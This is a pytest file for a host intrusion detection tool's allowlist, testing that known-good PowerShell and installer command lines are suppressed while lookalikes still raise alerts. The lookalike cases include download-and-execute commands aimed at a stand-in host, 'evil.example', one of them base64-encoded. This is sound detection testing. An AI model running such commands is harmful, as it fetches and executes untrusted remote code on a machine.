import json
from datetime import datetime
from pathlib import Path

import pytest

from hids.allowlist import AllowlistError, load_allowlist
from hids.events import Event
from hids.rules import evaluate
from hids.scorer import score_events

EXAMPLE = Path(__file__).parent.parent / "allowlist.example.json"

PS32 = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
PS_WOW = r"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
VSCODE_FLAGS = "-NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command"
PARSER_B64 = (
    "CgBmAHUAbgBjAHQAaQBvAG4AIABXAHIAaQB0AGUALQBSAGUAcwB1AGwAdAAoACQASgBzAG8AbgApACAAewAKACAA"
    "IAAgACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoA"
)

# Command lines / images taken from a real `hids scan` of a dev workstation.
KNOWN_GOOD = [
    (PS32, f'"{PS32}"  -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command '
           '"$__claudeCodeScript = $env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT; '
           '$env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT = $null; Invoke-Expression -Command $__claudeCodeScript" '),
    (PS32, f"{PS32} -NoProfile -NonInteractive -NoLogo -EncodedCommand {PARSER_B64}"),
    (PS32, f'"powershell.exe" {VSCODE_FLAGS} "Get-AppxPackage -Name \'Microsoft.VisualStudioCode\' '
           '| Select-Object -ExpandProperty PackageFullName"'),
    (PS_WOW, f'"{PS32}" {VSCODE_FLAGS} "Add-AppxPackage -Path '
             r"'C:\Users\Evan\AppData\Local\Programs\Microsoft VS Code\2d0b7506a3\appx\code_x64.appx' "
             r"-ExternalLocation 'C:\Users\Evan\AppData\Local\Programs\Microsoft VS Code\2d0b7506a3\appx'" '"'),
    (PS_WOW, f'"{PS32}" {VSCODE_FLAGS} "Remove-AppxPackage -Package '
             "'Microsoft.VisualStudioCode_1.0.141.1_neutral__8wekyb3d8bbwe'\""),
    (PS_WOW, f'"{PS32}" {VSCODE_FLAGS} "Get-CimInstance Win32_Process -Filter ""Name = \'dllhost.exe\'"" '
             "| Where-Object { $_.CommandLine -like '*/Processid:1C6DF0C0-192A-4451-BE36-6A59A86A692E*' } "
             '| ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction Stop } catch {} }"'),
    (PS32, '"powershell.exe" -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File '
           r'"C:\Program Files\WindowsApps\AppUp.IntelArcSoftware_26.36.2702.0_x64__8j3eq9eme6ctt\VFS'
           r'\ProgramFilesX64\Intel\Intel Graphics Software\SetupEventChannels.ps1"'),
    (r"C:\Windows\System32\schtasks.exe",
     r'schtasks.exe /Create /tn "Microsoft\Office\Office Feature Updates Logon" /XML '
     r'"C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}'
     r'\Microsoft_Office_Office Feature Updates Logon.xml"'),
    (r"C:\Users\Evan\AppData\Local\Temp\vscode-stable-user-x64\CodeSetup-stable-e646868227c3e3a9e3f24277c8c7220be42c0be7.exe", ""),
    (r"C:\Users\Evan\AppData\Local\Temp\is-B2DH1.tmp\CodeSetup-stable-e646868227c3e3a9e3f24277c8c7220be42c0be7.tmp", ""),
]


def _event(image, command_line, guid="g1"):
    return Event(
        event_id=1,
        timestamp=datetime(2026, 10, 23, 10, 0, 0),
        computer="TESTHOST",
        process_guid=guid,
        image=image,
        command_line=command_line,
    )


def _write(tmp_path, payload):
    path = tmp_path / "allow.json"
    path.write_text(json.dumps(payload), encoding="utf-8")
    return path


@pytest.mark.parametrize("image,command_line", KNOWN_GOOD)
def test_example_allowlist_suppresses_known_good(image, command_line):
    event = _event(image, command_line)
    assert evaluate(event), "fixture should trip a rule, or this test proves nothing"
    allowlist = load_allowlist(EXAMPLE)
    assert score_events([event], allowlist=allowlist) == []


@pytest.mark.parametrize("image,command_line", [
    # Known-good command with something appended: full match must reject it.
    (PS32, KNOWN_GOOD[0][1] + "; iex (iwr http://evil.example/x.ps1)"),
    # Same flags, different encoded payload.
    (PS32, f"{PS32} -NoProfile -NonInteractive -NoLogo -EncodedCommand SQBFAFgAIAAoAGkAdwByACkA"),
    # A different -Command behind the VS Code updater's flags.
    (PS32, f'"powershell.exe" {VSCODE_FLAGS} "Invoke-WebRequest http://evil.example"'),
    # Temp executable that only resembles the VS Code setup name.
    (r"C:\Users\Evan\AppData\Local\Temp\CodeSetup-stable-evil.exe", ""),
])
def test_example_allowlist_keeps_lookalikes(image, command_line):
    allowlist = load_allowlist(EXAMPLE)
    assert score_events([_event(image, command_line)], allowlist=allowlist)


def test_entry_only_suppresses_its_own_rule(tmp_path):
    path = _write(tmp_path, {"entries": [{"rule": "EXEC_FROM_TEMP", "image": r".*\\powershell\.exe"}]})
    risks = score_events([_event(PS32, f"{PS32} -nop")], allowlist=load_allowlist(path))
    assert [f.rule_id for f in risks[0].findings] == ["ENCODED_POWERSHELL"]


def test_hits_count_suppressed_findings_per_entry(tmp_path):
    path = _write(tmp_path, {"entries": [{"name": "nop", "rule": "ENCODED_POWERSHELL", "command_line": ".* -nop"}]})
    allowlist = load_allowlist(path)
    score_events([_event(PS32, "powershell.exe -nop", guid=f"g{i}") for i in range(3)], allowlist=allowlist)
    assert allowlist.hits == {"nop": 3}


@pytest.mark.parametrize("payload,message", [
    ([], "entries"),
    ({"entries": [{"rule": "ENCODED_POWERSHELL", "comand_line": "x"}]}, "unknown key"),
    ({"entries": [{"rule": "ENCODED_POWERSHELL"}]}, "at least one"),
    ({"entries": [{"command_line": "x"}]}, "rule"),
    ({"entries": [{"rule": "ENCODED_POWERSHELL", "image": "("}]}, "bad 'image' pattern"),
])
def test_load_rejects_malformed_allowlists(tmp_path, payload, message):
    with pytest.raises(AllowlistError, match=message):
        load_allowlist(_write(tmp_path, payload))
